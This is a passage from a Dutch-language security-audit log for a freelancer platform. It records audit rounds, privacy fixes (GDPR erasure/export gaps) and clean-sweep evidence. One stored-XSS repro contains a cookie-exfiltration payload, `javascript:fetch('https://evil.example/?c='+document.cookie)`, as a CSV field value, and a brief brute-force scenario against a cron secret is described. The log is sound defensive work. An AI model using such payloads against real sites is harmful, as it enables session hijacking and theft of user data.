  zwak `CRON_SECRET`; een ongethrottelde online brute-force van `POST /api/tasks/run-all` /
  `backups/heartbeat` kan het raden → op-afroep task-runs (reminder-/retentie-spam) of het maskeren van de
  backup-dead-man's-switch (`heartbeat` op `{ok:true}` zetten). **Precondities die de severity dempen:** een
  sterk `CRON_SECRET` (`openssl rand -base64 32`, zoals `.env.example:165` aanbeveelt) maakt brute-force
  onhaalbaar ongeacht rate-limiting; `timingSafeEqual` sluit het timing-side-channel al. Daarom
  defense-in-depth, niet een live bereikbaar gat. **Aanbevolen fix (aparte, kleine increment):** (1) een
  gedeelde `guardCronRequest(request)` die naast de 503/401 een per-IP `RateLimiter` toepast (429), toegepast
  op alle 16 routes; (2) een niet-fatale env-waarschuwing bij een `CRON_SECRET < 32` (symmetrisch met
  `AUTH_SECRET`, respecteert Architectuurregel 8 — nooit de boot breken). MENSENWERK: bevestig dat de
  productie-`CRON_SECRET` in Railway al hoge entropie heeft als stop-gap.
- **`/api/documents/[id]`: ontbrekende audit-tak bij "record bestaat, blob mist" (LAAG · AVG art. 5(2) volledigheid).**
  `src/app/api/documents/[id]/route.ts` (~r69–72): ná een geslaagde autorisatie geeft
  `storage.exists(doc.storageKey) === false` (een `Document`-rij zonder blob — integriteitsdrift) een 404
  **zonder auditregel**, terwijl found/forbidden/success in dit bestand allemaal wél auditen. Niet
  exploiteerbaar (post-autorisatie, alleen eigen document), maar een stille gat in de "wie-zag/probeerde-welk-
  document"-trail. **Aanbevolen fix:** route deze tak door hetzelfde `audit`/`auditDeniedAccess`-patroon, of
  documenteer expliciet waarom ze is uitgesloten.

## Ronde 2026-08-16b (basis: `main` @ b6f13fba) — 1× MIDDEL OPGELOST (erasure-gat op `Notification.readAt`)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: **authz/IDOR/mass-assignment** — volledige lees van álle 51 `src/app/**/actions.ts` server-actions op de
`auth→rol→ownership→Zod→actie→audit`-keten, incl. het als "niet individueel geopend" geparkeerde residu; 2:
**privacy/AVG** — erasure↔export-symmetrie over élk PII-/gedragsmetadata-veld in `schema.prisma`, PII-in-logs,
dataminimalisatie, k-anonimiteit; 3: **injectie/upload/SSRF/redirect/auth/headers/deps** — 11 export-routes op
formule-injectie, `dangerouslySetInnerHTML`, raw SQL, upload/path-traversal, SSRF, open redirect, wachtwoord-
reset-token, CSP/headers, `npm audit`, foutlek). Plus orchestrator-probes (document-/media-routes, k-anonimiteit,
mail-noop-PII, console-logging zelf geverifieerd).

**Uitkomst:** authz/IDOR-sweep **schoon** (geen bereikbaar gat — het "authz-dekkingsresidu" bleek een
review-procesgat, geen live kwetsbaarheid: alle 51 bestanden hadden de keten al correct). Injectie/upload/SSRF/
auth/headers/deps **schoon** (`npm audit --omit=dev` = 0; `next@15.5.21`/`next-auth@5.0.0-beta.32`/`prisma@6.19.3`
geen toepasselijke CVE). **Eén MIDDEL privacy-gat gevonden én gefixt** (zie hieronder), plus 3 LAAG/LOW geparkeerd.

### OPGELOST — `Notification.readAt` overleeft AVG art. 17-erasure (MIDDEL · AVG art. 17 + Architectuurregel 5)

**Geschonden regel:** Architectuurregel 5 (audit/AVG-symmetrie) + AVG art. 17 (recht op vergetelheid). Exact
dezelfde residuele-gedragsmetadata-klasse als `User.lastLoginAt`/`previousLoginAt` (ronde 2026-08-15) en
`ConversationParticipant.lastReadAt` (#1097) — hier op `Notification.readAt` (`prisma/schema.prisma`).

**Repro (vóór de fix):** ZZP'er A ontvangt en leest notificaties → elke gelezen rij krijgt een exact `readAt`-
tijdstip (wanneer A het platform gebruikte). Admin anonimiseert A op een art. 17-verzoek. De erasure-transactie
(`admin/gebruikers/actions.ts`) redact wél de notificatie-`body`, maar liet `readAt` staan op elke rij, nog steeds
gekoppeld aan de (hernoemde maar identieke) `User.id` → het platform bleef onbeperkt exact-getimede
engagement-metadata van een gewist individu bewaren. `grep readAt admin/gebruikers/actions.ts` = 0 hits.
**Ironie:** de vorige fix-writeup (deze backlog) noemde `Notification.readAt` als "al correct" — maar dat gold
alleen de **export**-kant; niemand controleerde de **erasure**, en die wiste 'm nooit.

**Fix (dit PR):** de brede eigen-feed-wipe zet nu `readAt: null` naast de body-redactie (binnen dezelfde
anonimiseringstransactie). Het account is na anonimisering SUSPENDED zonder wachtwoord → de leesstaat heeft geen
operationeel doel meer. Symmetrisch met de `readAt` die `account-export.ts` al prijsgaf.
**Test (rood→groen):** `anonymize-erasure.test.ts` — "wist de eigen leesbevestigingen op notificaties
(`Notification.readAt → null`)" selecteert de brede eigen-feed-`notification.updateMany` (`where == { userId }`)
en assert `readAt === null` + body geredact. Geverifieerd rood→groen door alleen de bronwijziging te reverten.

### GEPARKEERD (LAAG/LOW — repro + severity)

- **~~`LessonCompletion.completedAt` + `IdeaVote.createdAt` niet in erasure én niet in export (LAAG · AVG art. 15/17).~~**
  **OPGELOST in ronde 2026-08-19** (zie boven): hard delete in de erasure-transactie + opgenomen in `buildAccountExport`
  (symmetrie), met rood→groen-tests.
- **Registratie lekt e-mail-enumeratie (LOW · OWASP A07 / anti-enumeratie-inconsistentie).**
  `src/app/register/actions.ts` geeft een aparte veldfout ("Er bestaat al een account met dit e-mailadres.") bij een
  bestaand e-mailadres — inconsistent met de anti-enumeratie elders (login-timing-egalisatie, uniforme
  reset-respons). Begrensd door `registerRateLimiter` (per IP). Veelvoorkomende, vaak noodzakelijke UX; **product-/
  FG-afweging**: accepteren als gedocumenteerde trade-off, óf naar een "check je inbox"-respons met
  verificatie-mailflow. Geen code-defect; geen fix zonder productbeslissing.

## Ronde 2026-08-16 (basis: `main` @ cf0e2827) — GEEN nieuwe gaten in de delta (`e11b7cf9..cf0e2827`)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: **security/authz/IDOR/injectie** — de nieuwe delta-bestanden + brede sweep over route-handlers/server-actions
op auth→rol→ownership→Zod→actie→audit, IDOR, cross-tenant, `$queryRaw(Unsafe)`, `dangerouslySetInnerHTML`,
CSV-/formule-injectie, SSRF, open redirect, mass-assignment; 2: **privacy/AVG** — erasure↔export-symmetrie
(onafhankelijk geverifieerd, niet enkel het backlogdocument), dataminimalisatie, k-anonimiteit, PII-in-logs;
3: **runtime/deps** — `npm audit`, dependency-CVE's, headers/CSP, secrets, env-validatie). Plus orchestrator-
probes (headers/CSP + foutlek + versies zelf geverifieerd). **Delta-oppervlak:** #1105 (login-recency
erasure/export — al OPGELOST vorige ronde), #1106 (pre-shutdown drain-venster), #1107 (roster-CSV-export
`/franchise/zzpers/export`), #1108 (omzet-per-opdrachtgever `/inzicht`), #1109 (plaatsing-einddatum agenda-feed).

**Uitkomst:** géén nieuwe KRITIEK/HOOG/MIDDEL-bevinding. Alle nieuwe oppervlakken zijn read-only afgeleide
BI/export/agenda-features op reeds server-side gescoopte data; `git diff e11b7cf9..cf0e2827 -- prisma/schema.prisma`
is **leeg** (geen nieuw PII-veld → geen nieuw erasure/export-symmetriegat mogelijk). De twee reeds bekende,
naar de mens (FG) geëscaleerde items blijven open (zie onder): third-party-geschreven PII over de betrokkene bij
`anonymizeUser` (KRITIEK, juridische bewaargrond-afweging) en `kvkNumber` op het publieke profiel (LAAG, product/FG).

### GEEN NIEUWE GATEN — bewijs met OWASP/AVG-dekking

- **Nieuwe roster-CSV-export schoon (A01/A03/CWE-1236).** `src/app/(protected)/franchise/zzpers/export/route.ts`:
  `requireActor()` → expliciete `actor.role !== "FRANCHISER"` (403) → `tenantScopeWhere(actor)` (geen client-id/tenant
  geaccepteerd; scope server-side uit de sessie) → `enforceRateLimit(exportRateLimiter, franchise-roster:${actor.id})`
  → `ROSTER_EXPORTED`-audit (`audit-labels.ts:118`). CSV via `toCsv`/`escapeCsvField` (`src/lib/csv.ts:137-141`):
  formule-injectie-guard (`= + @ \t \r` en niet-numeriek `-` krijgen een `'`-prefix), getest in
  `roster-export.test.ts`. Filters (`q/availability/status/sort`) zijn in-memory pure TS op reeds gescoopte data,
  geen query-interpolatie, enums whitelisted.
- **Nieuwe BI-uitsplitsing schoon (A01/AVG-minimalisatie).** `getFreelancerRevenueBreakdown` scoopt strikt op
  `issuerUserId` + `status: PAID`; aangeroepen met `actor.id` uit de sessie (`inzicht/page.tsx`), geen id-parameter →
  geen IDOR. Eigen transactiedata van de actor → k-anonimiteit terecht niet van toepassing.
- **Agenda-feed-uitbreiding schoon (A01/AVG art. 17 liveness).** `/api/agenda/feed.ics` blijft: HMAC-token
  (`timingSafeEqual`) gebonden aan `u`, rate-limit op IP+`u` vóór DB-I/O, live liveness-poort
  (`status !== ACTIVE || anonymizedAt` → 404-anti-oracle) zodat een geschorst/gewist account niets meer serveert.
  De nieuwe `CollaborationDeadline.counterpartyName` draagt **geen bedragen** en is parity met het bestaande rooster
  (jobtitel + tegenpartij) — bewuste, gedocumenteerde risico-acceptatie voor deze bearer-feed, geen nieuwe klasse.
- **Injectie-/mass-assignment-sweep schoon (A03/A08).** 0× `$queryRawUnsafe`; de enige `$queryRaw` zijn statische
  `SELECT 1`-healthchecks; enige `dangerouslySetInnerHTML` = het nonce-gepoorte theme-script (`layout.tsx`); geen
  `data: { ...clientInput }`-spread van een rauwe client-payload.
- **Runtime/deps schoon.** `npm audit --omit=dev` (productie) = **0 kwetsbaarheden** → CI-`audit`-poort groen.
  Volledige audit: 3 **dev-only** transitieve items (`brace-expansion`/`js-yaml` HIGH via `@typescript-eslint`/lint,
  `esbuild` LOW Windows-only via `tsx`/`vite`) — niet in de productiebundel, blokkeren de poort niet. **LAAG/informatief**
  (aanbeveling: `npm audit fix` opportunistisch in een routine-PR). Versie-CVE-dekking (WebSearch, voorbij trainings-
  cutoff): `next` **15.5.21** dekt niet alleen CVE-2025-29927 (middleware-bypass, ≥15.2.3) maar landt **exact** op de
  **Next.js Security Release juli 2026** (9 CVE's, 4× HIGH — o.a. CVE-2026-64641 Server-Action-DoS, CVE-2026-64645
  rewrite/redirect-SSRF/open-redirect, CVE-2026-64649 Host-header-SSRF). `@auth/core` **0.41.3** / `next-auth`
  **5.0.0-beta.32** landen **exact** op de **Auth.js security-update juli 2026** (4 advisories: malformed Bearer in
  `getToken`, OAuth account-linking-confusion, provider-bound check-cookies, NFKC-e-mailnormalisatie). `prisma`/
  `@prisma/client` **6.19.3**: geen publieke ORM-CVE. `.env` niet in git; `scripts/scan-secrets.sh` schoon.
- **Headers/CSP + foutafhandeling schoon (A05).** Per-request nonce-CSP (geen `unsafe-inline` voor scripts in prod,
  `src/middleware.ts` + `lib/csp.ts`); `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `X-Frame-Options: DENY`,
  `Permissions-Policy`, HSTS `max-age=63072000; includeSubDomains; preload`. Elke gebruiker-gerichte foutmelding is
  een getypeerde domeinfout (`AuthorizationError`/`UploadValidationError`/`TransitionError`) met een gecontroleerde
  boodschap — geen rauwe stacktrace of Prisma-fout naar de gebruiker.

## Ronde 2026-08-15 (basis: `main` @ e11b7cf9) — 1× MIDDEL opgelost (erasure/export-gat op de login-recency-metadata)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: **alle 49 HTTP-route-handlers** — `src/app/**/route.ts` + `/api/**`: auth→rol→ownership→Zod→actie→audit,
IDOR op id-parameters, document-/PDF-/CSV-/ICS-/export-routes, path-traversal, SSRF, open redirect, foutlek;
2: **cross-tenant-isolatie** — alle `franchise/**`-pagina's/-actions/-routes + `lib/franchise/**`,
`lib/tenant-billing/**`, `tenancy.ts` (~90 query-sites getraceerd op `tenantId`-scoping + anti-oracle CWE-203);
3: **privacy/AVG** — erasure↔export-symmetrie over ~45 PII-velden uit `schema.prisma`, dataminimalisatie,
k-anonimiteit (markttarief ≥10), PII-in-logs, retentie; 4: **high-risk mutatie-server-actions** — admin-,
credential-/document-, samenwerking-/dispuut-/prestatie-/factuur-cascade, messaging/reviews: mass-assignment,
IDOR, statusovergangen via expliciete map, verplichte reden server-side, audit). Plus orchestrator-probes:
`npm audit --omit=dev` = **0 kwetsbaarheden**; Next.js 15.5.21 (voorbij CVE-2025-29927 middleware-bypass);
enige `dangerouslySetInnerHTML` = het nonce-gepoorte theme-script; geen `$queryRawUnsafe`; routing-SSRF veilig
(vaste host `api.geoapify.com`, user-input alleen als query-param); noop-mail logt geen adres in productie (M-3).
Delta sinds de vorige ronde: `35ad4811..e11b7cf9` (#1097 lastReadAt-erasure/export, #1098 franchise-fee-CSV-export,
#1101/#1104 pending-tasks/cascade-TOCTOU, #1102 worked-hours-trend, #1103 franchise-samenwerkingen-strip).

### OPGELOST — `User.lastLoginAt`/`previousLoginAt` overleeft erasure én ontbreekt in de data-export (MIDDEL · AVG art. 17 vergetelheid + art. 15/20 inzage/portabiliteit)

**Geschonden regel:** Architectuurregel 5 (audit/AVG-symmetrie) + AVG art. 17 (recht op vergetelheid) en
art. 15/20 (inzage/dataportabiliteit). Exact het patroon dat #1097 voor `ConversationParticipant.lastReadAt`
dichtte, maar dan voor de login-recency-gedragsmetadata op `User` (`prisma/schema.prisma:37-38`).

**Repro (vóór de fix):** `User.lastLoginAt` (laatste geslaagde login) en `previousLoginAt` (de login dáárvoor)
zijn toewijsbare gedragsmetadata óver de betrokkene. De server verwerkt ze actief in signalen die óók aan
**derden** worden getoond: de bemiddelaar ziet op `/franchise/zzpers` een roster-dormancy-/inzetbaarheids-tier
die uit `lastLoginAt` wordt afgeleid (`franchise/zzpers/page.tsx:144` selecteert `user.lastLoginAt`, geen
`status`-filter → een geanonimiseerde ZZP'er blijft met bevroren login-recency in het roster), en `signals.ts:1016`
(`lastActiveAt: f.user.lastLoginAt`) voedt hetzelfde. Tóch:

- **Erasure (art. 17):** `userAnonymizationData` (`account-anonymization.ts`) raakte deze twee velden niet
  (`grep` → 0 hits) → na een verwijderverzoek bleef de login-recency van het verwijderde individu staan en bleef
  een derde-partij-zichtbaar dormancy-signaal ervan afhangen — residuele gedragsmetadata die de vergetelheid overleeft.
- **Export (art. 15/20):** `buildAccountExport` (`account-export.ts`) selecteerde ze niet → een actieve gebruiker
  kon zijn eigen login-recency (die het platform over hem bewaart/verwerkt) niet inzien/exporteren.

**Fix (dit PR):**

- **Erasure:** `userAnonymizationData` zet nu `lastLoginAt: null` + `previousLoginAt: null` (toegepast binnen de
  bestaande anonimiseringstransactie via `prisma.user.update({ data: userAnonymizationData(...) })`). De
  wachtwoordloze account kan sowieso niet meer inloggen, dus er gaat niets nuttigs verloren. Analoog aan de
  `lastReadAt: null`-erasure van #1097.
- **Export:** `buildAccountExport` selecteert nu `lastLoginAt` + `previousLoginAt` in de `user.findUnique` —
  symmetrisch met de erasure en met `Notification.readAt`/`lastReadAt` die er al in zaten.
- **Tests (rood→groen):** `account-anonymization.test.ts` — `userAnonymizationData` zet beide op `null` (zonder
  fix: property afwezig → `undefined` → rood). `account-export.test.ts` — de `user`-select bevat beide
  (zonder fix: `undefined` → rood). Geverifieerd rood→groen door alleen de bronwijziging te reverten.

### GEEN NIEUWE GATEN in de overige oppervlakken (bewijs, met OWASP/AVG-dekking)

- **Route-handlers schoon (A01/A03).** 49/49 `route.ts` gecontroleerd: elke document-/PDF-/dossier-route poort via
  `canAccessDocument` (owner/ADMIN), anti-oracle 404 voor onbekend-id én verboden-id, serveert enkel via de
  storage-abstractie (geen publiek pad, traversal-safe), audit op toegang én weigering; cron-routes via
  `authorizeCron` (`timingSafeEqual`, fail-closed 503); `/api/agenda/feed.ics` HMAC-token + liveness-check;
  `/api/push/subscribe` endpoint-allowlist (anti-SSRF) + bind op `actor.id`; webhook signature-verified + idempotent.
- **Cross-tenant isolatie schoon (A01).** ~90 query-sites in `franchise/**`/`lib/franchise/**`/`lib/tenant-billing/**`
  scopen via `tenantScopeWhere`/`ownsViaTenant`/`assertSameTenant` op `actor.tenantId`; onbekend-id en cross-tenant-id
  vallen samen tot identiek "niet gevonden" (CWE-203). Franchisers krijgen enkel credential-/bestandsmetadata, nooit
  raw document-download. Fee-CSV-export `FRANCHISER`-only, tenant-gescopet, ge-audit, formule-injectie-guard.
- **Mutatie-server-actions schoon (A01/A08).** ~27 high-risk `actions.ts` + 4 cascade-command-modules: volledige
  auth→rol→ownership→Zod→actie→audit-keten, geen mass-assignment (`data: { ...clientInput }` nergens), statusovergangen
  via `assert*Transition`-maps, TOCTOU-dichting via compound-guarded `updateMany({ where: { id, status: from } })`,
  verplichte afwijs-/dispuutreden server-side afgedwongen, dispuut-resolutie ADMIN-only.
- **Privacy/AVG overig schoon.** ~45 PII-velden erasure↔export-symmetrisch (o.a. `lastReadAt`, credential-/dispuut-/
  no-show-/shift-handoff-vrije tekst, review-comments, factuur-afwijsreden via `Notification.body`); k-anonimiteit
  `MARKET_RATE_MIN_SAMPLE = 10` (met regressietest); geen nieuwe ongeredacteerde PII in logs; sinds #1097 zijn er 0
  nieuwe `schema.prisma`-PII-velden bijgekomen.
- **`npm audit` — CI-poort groen.** `--omit=dev` (productie) = **0 kwetsbaarheden**. Dev-only items (`brace-expansion`/
  `esbuild`/`js-yaml`, transitief via eslint/esbuild) blokkeren de `audit`-poort niet. **LAAG/informatief.**

## Ronde 2026-08-14b (basis: `main` @ 35ad4811) — 1× MIDDEL opgelost (erasure/export-gat op de nieuwe leesbevestiging)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: alle nieuwe mutatie-oppervlakken sinds `d5ea18dd` — leesbevestiging (`markConversationRead`),
betaalherinnering (`sendPaymentReminder`), VAPID/push-config → auth→rol→ownership→Zod→actie→audit + IDOR +
secret-lek; 2: privacy/AVG — erasure↔export-symmetrie voor het nieuwe `lastReadAt`-veld, dataminimalisatie/
k-anonimiteit op de nieuwe trend-aggregaties (`expense-trend`, `tenant-fee-trend`), publieke juridische
pagina's, logger-PII-redactie; 3: cross-tenant-isolatie (alle `franchise/**`-routes/-actions), injectie-sweep
repo-breed (SQL/XSS/href/CSV/ICS/SSRF) + cascade-`completion.ts`), plus orchestrator-probes (`npm audit`,
runtime-build) en een schone build (`npm run build` groen, exit 0). Delta sinds de vorige ronde:
`d5ea18dd..35ad4811` (#1086 stored-XSS-fix, #1087 logger-PII, #1088 VAPID-env-guard, #1090 race-veilige
factuurnummering, #1091 juridische conceptpagina's, #1092/#1094/#1095 ZZP-BI/HIBP/betaalherinnering, #1093/#1096
persona-sweep + leesbevestiging).

### OPGELOST — Nieuw `ConversationParticipant.lastReadAt` overleeft erasure én ontbreekt in de data-export (MIDDEL · AVG art. 17 vergetelheid + art. 15/20 inzage/portabiliteit)

**Geschonden regel:** Architectuurregel 5 (audit/AVG-symmetrie) + AVG art. 17 (recht op vergetelheid) en
art. 15/20 (inzage/dataportabiliteit). De leesbevestiging-feature (#1096, "Gezien") introduceerde
`lastReadAt` op `ConversationParticipant` (`prisma/schema.prisma:598`), maar dat veld werd níét meegenomen in
de twee AVG-poorten die élk ander PII-adjacent veld wél afdekken.

**Repro (vóór de fix):** ZZP'er A en opdrachtgever B chatten. A leest B's laatste bericht op tijdstip `T`.
Admin anonimiseert A (art. 17-verzoek). `anonymizeUser` (`admin/gebruikers/actions.ts`) bevatte géén enkele
`conversationParticipant`-operatie (`grep` → 0 hits) → A's `lastReadAt` blijft op `T` staan. B heropent het
gesprek: de "Gezien"-markering (afgeleid uit `other.lastReadAt`, `berichten/[id]/page.tsx`) blijft voor altijd
onder B's bericht staan met A's bevroren leestijdstip — residuele gedragsmetadata over het verwijderde
individu die een vergetelheidsverzoek overleeft. Spiegelbeeldig ontbrak het veld ook in `buildAccountExport`
(`account-export.ts`), terwijl het vergelijkbare `Notification.readAt` er wél in zit → A kon zijn eigen
leesactiviteit niet inzien/exporteren (art. 15/20).

**Fix (dit PR):**

- **Erasure:** `anonymizeUser` zet nu binnen dezelfde `$transaction` `lastReadAt: null` voor alle
  `ConversationParticipant`-rijen van de betrokkene (`where: { userId }`) — de rij/gesprekshistorie blijft
  intact (berichten van de tegenpartij ongemoeid), alleen het toewijsbare tijdstip verdwijnt. Analoog aan de
  bestaande `pushSubscription.deleteMany` (toestel-/gedragsmetadata).
- **Export:** `buildAccountExport` bevat nu een `readReceipts`-sectie (`conversationParticipant.findMany`,
  gescopet op `userId: actorId`, select `conversationId`+`lastReadAt`) — symmetrisch met `Notification.readAt`.
- **Tests (rood→groen):** `anonymize-erasure.test.ts` — de erasure roept `conversationParticipant.updateMany`
  met `{ userId }` → `lastReadAt: null` aan (zonder fix: `find(...)` = undefined → rood). `account-export.test.ts`
  — `readReceipts` is present en gescopet op de actor (zonder fix: property afwezig → rood).

**Sweep:** de schrijf-/leespaden van de feature zelf zijn schoon — `markConversationRead` schrijft via de
composite-PK-gescopete `updateMany({ where: { conversationId, userId: actor.id } })` (geen IDOR), en de
"Gezien"-markering exposeert alleen een boolean onder een bericht-id, nooit het rauwe tijdstip naar de client.

### GEEN NIEUWE GATEN in de overige oppervlakken (bewijs, met OWASP/AVG-dekking)

- **Nieuwe mutaties schoon (A01/A08).** `sendPaymentReminder` (`facturen/actions.ts:385`) volgt
  auth→`requireRole("FREELANCER")`→ownership (`invoice.collaboration.freelancer.userId === actor.id`,
  default-deny voor losse facturen)→afkoelperiode uit het **auditlogboek** (niet client)→notificatie+
  `INVOICE_REMINDER_SENT`-audit in één transactie. `openstaand-reminders.ts` is een pure UI-hint; de gate zit
  server-side. VAPID (`env.ts`/`web-push.ts`): half-activatie = harde bootfout (regel 8), `VAPID_PRIVATE_KEY`
  verlaat de server nooit; alleen de publieke sleutel gaat auth-gated naar de client (RFC 8292).
- **Cross-tenant isolatie schoon (A01).** Elke `franchise/**`-query scoopt via `tenantScopeWhere(actor)`/
  `ownsViaTenant`/`assertSameTenant` op `actor.tenantId` (server-side uit `currentActor()`); onbekend-id en
  cross-tenant-id geven identieke "niet gevonden" (anti-oracle CWE-203). Franchisers krijgen geen
  document-download (`canAccessDocument` = owner/ADMIN), alleen credential-metadata.
- **Injectie schoon (A03).** Geen `$queryRawUnsafe`/`$executeRawUnsafe`; enige `dangerouslySetInnerHTML` = het
  nonce-gepoorte theme-script; alle `website`-hrefs via `httpUrl()` (bulk-import-bypass reeds gedicht in #1086);
  CSV via `escapeCsvField`/`toCsv` (formule-injectie-guard); ICS-escaping compleet; geen SSRF (externe fetch
  bouwt URL uit env-`baseUrl`, nooit uit request-input).
- **Publieke juridische pagina's schoon.** `/voorwaarden`, `/privacy`, `/cookies`: statische NL-tekst, geen
  `dangerouslySetInnerHTML`, geen secrets/PII/interne hostnames; route-guard exact-match (`/privacy/intern`
  blijft gepoort, getest).
- **Logger-PII schoon.** De zes nieuwe camelCase naamvelden worden geredacteerd; de structurele test parseert
  `schema.prisma` en breekt CI bij een nieuw ongeredacteerd `*Name`-veld.
- **`npm audit` — CI-poort groen.** `--omit=dev` (productie) = **0 kwetsbaarheden**. De volledige audit (incl.
  dev) toont 3 dev-only items (`brace-expansion`/`esbuild`/`js-yaml`, transitief via eslint/esbuild-devserver)
  — informatief, blokkeert de poort niet, geen productiepad. **LAAG/informatief**, geparkeerd hieronder.

### GEPARKEERD — dev-only `npm audit`-bevindingen (LAAG · informatief, geen productiepad)

`npm audit` (volledig, incl. dev): `brace-expansion` (HOOG, via `@typescript-eslint`), `esbuild` (LAAG,
dev-server arbitrary file read op Windows), `js-yaml` (HOOG, quadratische CPU-DoS). Alle drie **dev-tooling
transitief**, niet in de productie-bundle → de CI-`audit`-poort (`npm audit --audit-level=high --omit=dev`)
is groen (0). `npm audit fix` zou de lockfile churnen; niet urgent, geen datalek-/boeterisico. Volgen bij een
volgende dependency-bump.

## Ronde 2026-08-14 (basis: `main` @ d5ea18dd) — 2× HOOG opgelost (stored XSS in bulk-import + PII-redactie-gat in logger)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: alle server actions + `/api`-route-handlers → auth→rol→ownership→Zod→actie→audit + IDOR + cross-tenant +
mass-assignment; 2: privacy/AVG — erasure↔export-symmetrie, dataminimalisatie, k-anonimiteit, PII-in-logs,
retentie; 3: injectie (SQL/XSS/CSV/ICS/SSRF) + upload/storage + secrets + headers/CSP + foutafhandeling +
open redirect + `npm audit`), plus onafhankelijke orchestrator-probes (deel-token/`/vertrouwen`,
password-reset, `/api/metrics`-autorisatie, public-route-allowlist) en een schone build (`npm run build`
groen). Delta sinds de vorige ronde: `0cec5281..d5ea18dd` (#1081 DUO/BIG/iDIN HTTP-retry/-timeout hardening
— geverifieerd schoon: env-only base-URLs (geen SSRF), geen PII in foutmeldingen; #1082 de vorige auditdoc).

### OPGELOST — Stored XSS via ongevalideerd `website`-veld in admin CSV-bulk-import (HOOG · OWASP A03 / CWE-79)

**Geschonden regel:** Architectuurregel 1 (server-side is de waarheid — Zod-validatie op elke mutatie) +
regel 2 (auth→rol→ownership→**Zod**→actie→audit). De admin-bulk-import omzeilde de canonieke `httpUrl()`-guard.

**Repro (vóór de fix):** Een ADMIN importeert via `/admin/import` een CSV (bv. een klantenlijst van een
bemiddelaar/partner die de admin niet zelf schreef — de vertrouwensgrens is de herkomst van het bestand, niet
"een admin typte het") met een rij `rol=opdrachtgever;bedrijfsnaam=Test BV;website=javascript:fetch('https://evil.example/?c='+document.cookie)`.
`buildImportPreview`/`commitImport` accepteerden de waarde ongewijzigd (`website: get(rec,"website") || null`,
`src/lib/onboarding/import.ts:258`; write `website: row.website ?? undefined`,
`src/app/(protected)/admin/import/actions.ts:253`) — géén schema-check. De waarde belandt rauw in
`Company.website` en wordt als **ongefilterde `href`** gerenderd op het bedrijfsprofiel
(`src/components/company/company-profile-screen.tsx:222`) én op elke opdracht van dat bedrijf
(`src/app/(protected)/opdrachten/[id]/page.tsx:763`). React 19 blokkeert een `javascript:`-href niet in
productie → klikken voert aanvaller-JS uit in de geauthenticeerde sessie van elke ZZP'er/opdrachtgever die de
link opent (sessie-/tokendiefstal op een platform met VOG/diploma/ID-documenten). Cross-user impact.

**Fix (dit PR):**

- Parse-laag (de gedeelde bron van waarheid die zowel de preview als `commitImport` gebruikt): nieuwe
  `parseWebsite()` in `src/lib/onboarding/import.ts` valideert via `httpUrl()` (weigert `javascript:`/`data:`
  e.d.); ongeldige waarde → waarschuwing + waarde gedropt (rij blijft importeerbaar, net als een onleesbaar
  uurtarief).
- Defense-in-depth vlak vóór de write: `safeWebsite()` in `admin/import/actions.ts` her-valideert met
  `httpUrl()` (net als `assertImportRole` naast het rol-veld), zodat een toekomstige refactor die ooit een
  niet-geparste rij zou doorgeven niet kan regresseren.
- Tests (rood→groen): `src/lib/onboarding/import.test.ts` — `javascript:`- en `data:`-website worden gedropt
  met een `website`-warning, geldige `https://`-website blijft behouden.

**Sweep:** de andere twee `href={…website}`-sinks (`profile.website`, `job.company.website`) worden
uitsluitend gevoed door `freelancerProfileSchema`/`companyProfileSchema` (beide `httpUrl()`,
`src/lib/validation.ts:174,189`) — de bulk-import was de énige bypass; de klasse is nu volledig gedicht.

### OPGELOST — PII-redactie in logger/Sentry mist compound naamvelden (HOOG sluimerend · AVG art. 5(1)(f))

**Geschonden regel:** Architectuurregel 9 (logging lekt geen PII) / AVG art. 5(1)(f) (integriteit &
vertrouwelijkheid). `docs`-aanname op meerdere plekken (`safe-action-error.ts`, `report.ts`,
`sentry-options.ts`) dat `logger`/`reportError` "PII zelf redacteert" — die aanname klopte niet voor de
compound naamvelden.

**Repro (vóór de fix, uitgevoerd tegen de echte module):** `isSensitiveKey()`
(`src/lib/observability/logger.ts`) toetst naam-sleutels alléén op EXACTE gelijkheid tegen een vaste set
(bewust geen substring, om `filename`/`username` te sparen). Die set miste echter de camelCase naamvelden
die dit platform daadwerkelijk gebruikt in de identiteits-/diploma-/BIG-verificatie:
`redact({ verifiedName, verifiedLegalName, accountName, providedName, holderName, organizationName })` liet
al die velden ongeredacteerd door — alleen de letterlijke sleutel `name` werd `[redacted]`. Omdat
`sentry-options.ts` dezelfde `redact()` hergebruikt in `beforeSend`, zou een toekomstig debug-logstatement in
de gevoeligste flow (bv. `logger.warn("idin-mismatch", { accountName, providedName })`) de volledige
juridische naam naar de hosting-logs én naar Sentry (externe, mogelijk buiten-EER verwerker) sturen. **Géén
actief call-pad vandaag** (de catch-blocks loggen alleen `describeError`), dus HOOG-sluimerend i.p.v. KRITIEK
— een gat in het vangnet, niet een actieve lek.

**Fix (dit PR):**

- `REDACT_KEY_EXACT` uitgebreid met `verifiedname`, `verifiedlegalname`, `accountname`, `providedname`,
  `holdername`, `organizationname` (raakt via de exacte match géén niet-PII als `filename`/`skillName`).
- **Structurele poort tegen herhaling:** nieuwe test `logger.pii-name-coverage.test.ts` leest
  `prisma/schema.prisma`, extraheert elk veld op `Name`/`Naam` en dwingt af dat het óf geredacteerd wordt óf
  expliciet op `KNOWN_NON_PII_NAME_FIELDS` (`filename`, `partnername`) staat — een toekomstig naamveld breekt
  zo de CI-poort i.p.v. stil door te lekken.
- Tests (rood→groen): `logger.test.ts` — de zes verificatie-naamvelden redacten; `filename`/`skillName`/
  `eventName` blijven intact.

## Ronde 2026-08-13b (basis: `main` @ 0cec5281) — geen nieuwe gaten

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(1: alle server actions + `/api`-route-handlers → auth→rol→ownership→Zod→actie→audit + IDOR + mass-assignment;
2: privacy/AVG — anonymizeUser↔buildAccountExport-symmetrie veld-voor-veld, k-anonimiteit, PII-in-logs,
dataminimalisatie, retentie; 3: injectie (SQL/XSS/CSV/ICS/SSRF) + upload/storage + secrets + headers/CSP +
foutafhandeling + open redirect), plus onafhankelijke orchestrator-probes + een schone build (`npm run build`
